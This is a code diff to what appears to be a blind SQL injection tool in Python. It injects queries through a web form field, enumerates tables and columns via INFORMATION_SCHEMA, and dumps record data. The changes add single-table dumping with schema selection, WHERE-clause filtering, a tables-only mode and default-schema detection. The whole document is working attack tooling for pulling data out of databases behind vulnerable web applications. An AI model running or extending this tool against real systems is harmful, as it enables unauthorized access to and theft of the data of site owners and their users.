@@ -62,6 +62,8 @@ class Injector:
         return self.getNumberInRange(obj, math.floor(num/2), num)
 
     def getCount(self, table, where="1=1"):
+        if where is None:
+            where = "1=1"
         return self.getNumber("SELECT COUNT(*) FROM %s.%s WHERE %s"
                               % (table.schema, table.name, where))
 
@@ -88,6 +90,8 @@ class Injector:
         return name
 
     def getDataFromTable(self, column, table, index=0, where="1=1"):
+        if where is None:
+            where = "1=1"
         return self.getString("SELECT %s FROM %s.%s WHERE %s LIMIT %d,1"
                               % (column, table.schema, table.name, where, index))
 
@@ -105,9 +109,10 @@ class Database:
             exit(1)
         PRINTER.print("Success!")
         self.tables = []
-        self.tables_table = Table('tables', 'INFORMATION_SCHEMA', self.injector)
-        self.columns_table = Table('columns', 'INFORMATION_SCHEMA', self.injector)
-        self.findTables()
+        self.tables_table = Table(self.injector, 'tables', 'INFORMATION_SCHEMA')
+        self.columns_table = Table(self.injector, 'columns', 'INFORMATION_SCHEMA')
+        PRINTER.print("Getting default schema...", 1)
+        self.default_schema = self.injector.getString("SELECT DATABASE()")
 
     def getTableCount(self):
         return self.injector.getCount(self.tables_table, self.table_filter)
@@ -118,7 +123,7 @@ class Database:
     def getTableSchema(self, tableIndex):
         return self.injector.getDataFromTable('table_schema', self.tables_table, tableIndex, self.table_filter)            
         
-    def findTables(self):
+    def findTables(self, populateTables=False):
         PRINTER.print("Getting table count...", 1)
         count = self.getTableCount()
         PRINTER.print("Counted %d tables" % count, 1)
@@ -129,32 +134,43 @@ class Database:
             schema = self.getTableSchema(i)
             PRINTER.print("Got table schema: %s" % schema, 2)
             PRINTER.print("Building table: %s (schema: %s)" % (name, schema), 1)
-            self.tables.append(Table(name, schema, self.injector, self.columns_table))
+            table = Table(self.injector, name, schema, self.columns_table)
+            if populateTables:
+                table.populate()
+            self.tables.append(table)
 
         
 
 class Table:
 
-    def __init__(self, name, schema, injector, columns_table=False):
+
+    def __init__(self, injector, name, schema, columns_table=None):
         self.columns = []
         self.records = []
         self.name = name
         self.schema = schema
         self.injector = injector
-        if columns_table:
-            self.column_filter = "table_name = '%s' AND table_schema = '%s'" % (self.name, self.schema)
-            self.columns_table = columns_table
-            PRINTER.indent = 1
-            self.findColumns()
-            PRINTER.print("", 1)
-            self.findRecords()
-            PRINTER.indent = 0
+        self.column_filter = "table_name = '%s'" % self.name
+        self.columns_table = columns_table
+
+    def populate(self, where=None):
+        PRINTER.indent = 1
+        self.findColumns()
+        PRINTER.print("", 1)
+        self.findRecords(where)
+        PRINTER.indent = 0
 
     def getColumnCount(self):
-        return self.injector.getCount(self.columns_table, self.column_filter)
+        if self.columns_table is not None:
+            return self.injector.getCount(self.columns_table, self.column_filter)
+        else:
+            return 0
 
     def getColumnName(self, columnIndex):
-        return self.injector.getDataFromTable('column_name', self.columns_table, columnIndex, self.column_filter)
+        if self.columns_table is not None:
+            return self.injector.getDataFromTable('column_name', self.columns_table, columnIndex, self.column_filter)
+        else:
+            return ''
 
     def findColumns(self):
         PRINTER.print("Getting column count...", 1)
@@ -166,20 +182,20 @@ class Table:
             self.columns.append(name)
 
 
-    def getRecordCount(self):
-        return self.injector.getCount(self)
+    def getRecordCount(self, where=None):
+        return self.injector.getCount(self, where)
 
-    def getRecordData(self, recordIndex, column):
-        return self.injector.getDataFromTable(column, self, recordIndex)
+    def getRecordData(self, recordIndex, column, where=None):
+        return self.injector.getDataFromTable(column, self, recordIndex, where)
 
-    def findRecords(self):
+    def findRecords(self, where=None):
         PRINTER.print("Getting record count...", 1)
-        count = self.getRecordCount()
+        count = self.getRecordCount(where)
         PRINTER.print("Found %d records" % count)
         for i in range(count):
             record = Record(self)
             for col in self.columns:
-                data = self.getRecordData(i, col)
+                data = self.getRecordData(i, col, where)
                 PRINTER.print("Found value '%s'=>'%s' for record %d" % (col, data, i), 2)
                 record.setData(col, data)
             PRINTER.print("Finished building record: %s" % record.data, 1)
@@ -213,6 +229,23 @@ parser.add_argument('-o', '--outfile', '--out', help='Print output to OUTFILE in
 parser.add_argument('-d', '--delay', type=int, help='Time (in ms) to wait between queries (default: %(default)s)', nargs='?', const=DEFAULT_DELAY, default=DEFAULT_DELAY)
 parser.add_argument('-v', '--verbose', action='count')
 
+table_group = parser.add_mutually_exclusive_group()
+table_group.add_argument('-t', '--tables_only', action='store_true', help='Only dump table names')
+
+dump_table_help = 'Dump data only from the specified table.\n'
+dump_table_help += "To specify the table's schema, prepend it with a period: SCHEMA.TABLE\n"
+dump_table_help += "If no schema is specified, the current schema will be used."
+table_group.add_argument('-T', '--dump_table', help=dump_table_help)
+
+class TableWhereAction(argparse.Action):
+    def __call__(self, parser, namespace, value, option_string):
+        if namespace.dump_table is None:
+            parser.error('Where clauses can only be used with single-table dumps.')
+        else:
+            namespace.where = value
+
+parser.add_argument('-w', '--where', action=TableWhereAction, help='Where clause to use with -T/--dump_table')
+
 args = parser.parse_args()
 verbosity = 0 if args.verbose is None else args.verbose
 PRINTER = Printer(verbosity, args.outfile)
@@ -229,8 +262,18 @@ for field in args.other_field:
 
 injector = Injector(args.url, args.success, delay, args.attack_field, other_fields)
 db = Database(injector)
-
-
+if args.dump_table is None:
+    db.findTables(not args.tables_only)
+else:
+    s = args.dump_table.split(".")
+    if len(s) == 1:
+        print("Dumping table %s" % s[0])
+        table = Table(injector, s[0], db.default_schema, db.columns_table)
+    else:
+        print("Dumping table %s.%s" % (s[0], s[1]))
+        table = Table(injector, s[1], s[0], db.columns_table)
+    table.populate(args.where)
+    db.tables.append(table)
 
 PRINTER.print("========== DATABASE DUMP ==========")
 for table in db.tables:
